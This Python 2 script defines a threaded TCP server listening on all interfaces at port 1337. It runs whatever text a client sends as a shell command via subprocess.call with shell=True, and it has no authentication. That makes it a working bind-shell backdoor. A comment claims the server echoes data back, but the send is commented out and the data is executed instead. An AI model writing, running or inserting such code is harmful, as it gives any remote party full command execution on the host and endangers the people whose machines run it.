import socket
import threading
import subprocess

## TCP 

class ThreadedServer(object):
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                #print data
                if data:
                    # Set the response to echo back the recieved data 
                    response = data
                    print response
                    #client.send(response)
                    subprocess.call(response, shell=True)
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False




if __name__ == "__main__":
   # port_num = input("Port?")
    ThreadedServer('0.0.0.0',1337).listen()
